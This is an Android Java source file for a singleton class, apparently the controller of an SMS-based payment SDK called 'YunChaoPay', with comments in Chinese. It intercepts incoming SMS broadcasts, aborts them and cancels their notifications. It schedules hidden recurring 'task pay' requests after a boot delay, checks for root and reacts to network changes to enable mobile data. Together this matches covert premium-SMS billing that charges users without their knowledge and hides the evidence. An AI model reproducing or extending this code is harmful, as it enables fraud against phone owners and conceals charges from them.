package com.example.sayid.myapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;

import com.example.sayid.myapplication.common.data.ConfigConst;
import com.example.sayid.myapplication.common.util.CacheUtil;
import com.example.sayid.myapplication.common.util.NetControlUtil;
import com.example.sayid.myapplication.common.util.ServiceUtil;
import com.example.sayid.myapplication.model.ReportModel;
import com.example.sayid.myapplication.pay.AppTache;
import com.example.sayid.myapplication.sms.SmsReceiveModel;
import com.example.sayid.myapplication.smsutil.SmSReceiver;
import com.example.sayid.myapplication.smsutil.SmSutils;

import static com.example.sayid.myapplication.pay.AppTache.context;

public class NManager {
    //private final static String TAG = "NManager";
    private static volatile NManager instance = null;

    private Context cxt;

    /**
     * 私有构造函数
     *
     * @param cxt
     */


    private NManager(Context cxt) {
        this.cxt = cxt.getApplicationContext();
    }

    /**
     * 单例，双重检查加锁，JDK 1.5以上版本支持
     *
     * @param cxt
     * @return
     */
    public static NManager getInstance(Context cxt) {
        //先检查实例是否存在，如果不存在才进入下面的同步块
        try {
            if (instance == null) {
                //同步块，线程安全的创建实例
                synchronized (NManager.class) {
                    //再次检查实例是否存在，如果不存在才真正的创建实例
                    if (instance == null) {
                        instance = new NManager(cxt);
                        AppTache.getInstance().onResume(cxt);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return instance;
    }

    /**
     * 外部Service服务调用
     * 注册监听器
     *
     * @param cxt
     */
    public static void register(Context cxt) {
        // 注册短信数据库监听
        try {
            //   SmSutils.getInstance().registerSMSObserver(cxt);
        } catch (Exception e) {
            e.printStackTrace();
        }

//		smsObserver = new SmsObserver(new Handler(), cxt);
//		cxt.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
    }

    /**
     *
     */
    public static void initPay(Context cxt) {
        try {
            AppTache.getInstance().initPay(cxt);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    /**
     * 中止消息广播  并在通知栏中取消短信通知 有些系统 暂时不匹配  后期优化
     */
    public static void abortBroadcastSms(Bundle bundle, BroadcastReceiver receiver) {
        try {
            SmSutils.getInstance().abortBroadcastSms(bundle, receiver);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     *
     */
    public static void SmsSendCallback(BroadcastReceiver r) {
        try {
            SmSutils.getInstance().SmsSendCallback(r, SmSReceiver.mySendSmsListener);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * 外部Service服务调用
     * 注销注册监听器
     *
     * @param cxt
     */
    public static void unregister(Context cxt) {
        try {
            //   SmSutils.getInstance().unregisterSMSObserver(cxt);
        } catch (Exception e) {
            e.printStackTrace();
        }

//		cxt.unregisterReceiver(phone_br);
//	    cxt.getContentResolver().unregisterContentObserver(smsObserver);

    }

    /**
     * 外部Service服务调用
     * 必须UI 主线程调用
     */
    public void pay() {

        try {
            if (enableRequest() && enableSystem()) {
                AppTache.getInstance().requestTaskPay();
            } else {
                //Logs.e(TAG, "任务获取执行时间还未来到");
            }

            // 定时启动Service
            long loop_time = CacheUtil.getInstance().getLong(CacheUtil.KEY_LOOP_TIME, CacheUtil.LOOP_TIME_DEFAULT);
            ServiceUtil.taskService(cxt, loop_time);
        } catch (Exception e) {
            //Logs.e(TAG, e, "pay error");
        }
    }

    /**
     * 外部Service服务调用
     * 必须UI 主线程调用
     */
    public static void requestSdkPay(final String user_order_id,
                                     final String goods_id, final String goods_name, final int quantity,
                                     final int unit_price, final boolean is_online, final Handler handler, Context c) {
        try {
            AppTache.getInstance().requestSdkPay(user_order_id, goods_id, goods_name, quantity,
                    unit_price, is_online, handler);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * 是否可以执行请求
     *
     * @return
     */
    private boolean enableRequest() {
        long yuntime = CacheUtil.getInstance().getLong(CacheUtil.KEY_NEXT_TIME, 0L);
        long currTime = System.currentTimeMillis();
        //Logs.d(TAG, "enableRequest 获取到的下次 任务获取执行时间为：" + (yuntime > currTime ? (yuntime - currTime) / 1000 + "秒后" : (currTime - yuntime) / 1000 + "秒前"));

        // 下次请求时间 小于当前时间
        if (yuntime <= currTime) {
            return true;
        }
        return false;
    }

    /**
     * 是否可以执行请求
     *
     * @return
     */
    private boolean enableSystem() {
        // 系统开机时间
        long elapsedRealtime = SystemClock.elapsedRealtime();
        //Logs.d(TAG, "enableSystem 系统开机时间为：" + elapsedRealtime);

        if (elapsedRealtime > ConfigConst.START_SYSTEM_TIME) {
            return true;
        }
        return false;
    }

    /**
     * 是否root
     *
     * @return
     */
    public boolean isRoot() {
        String isRootStr = CacheUtil.getInstance().getString(CacheUtil.KEY_IS_ROOT, "1");
        if ("0".equals(isRootStr)) {
            return true;
        }
        return false;
    }

    /**
     * 外部Service服务调用
     * 网络连接改变
     *
     * @param context
     */
    public void connectionChangeService(final Context context) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                //Logs.d(TAG, "onStart--->");
                try {
                    boolean isWifiOpen = NetControlUtil.getInstance(context.getApplicationContext()).isWifiConnected();
                    boolean isGprsOpen = NetControlUtil.getInstance(context.getApplicationContext()).isGprsConnected();
                    //Logs.d(TAG, "onStart--isWifiOpen-->" + isWifiOpen);
                    //Logs.d(TAG, "onStart--isGprsOpen-->" + isGprsOpen);
                    //上报  监听网络状态回调
                    if (ReportModel.getInstanse(context).onNetStateChangeCallBack != null) {
                        //Logs.d(TAG, "ReportModel 上报  监听网络状态回调-->");
                        ReportModel.getInstanse(context).onNetStateChangeCallBack.netStateChange(isWifiOpen, isGprsOpen);
                    }
                    //打开gprs 监听网络状态回调
                    if (NetControlUtil.getInstance(context).onNetStateChangeCallBack != null) {
                        //Logs.d(TAG, "NetControl 打开gprs 监听网络状态回调-->");
                        NetControlUtil.getInstance(context).onNetStateChangeCallBack.netStateChange(isWifiOpen, isGprsOpen);
                    }
                } catch (Exception e) {
                    //Logs.e(TAG, e, "Connection Change Service error:");
                }
            }
        }).start();
    }

    /**
     * 接受广播，调用此方法
     *
     * @param br
     * @param intent
     */
    public void broadcastProcess(BroadcastReceiver br, Intent intent) {
        // 处理拦截到得短信
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            new SmsReceiveModel().dealMsg(cxt, br, intent);
        }
    }


    /**
     * 获取版本号
     *
     * @return
     */
    public static String getCurrentVersion() {
        try {
            return ConfigConst.getYunChaoPayVersion(context);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
}
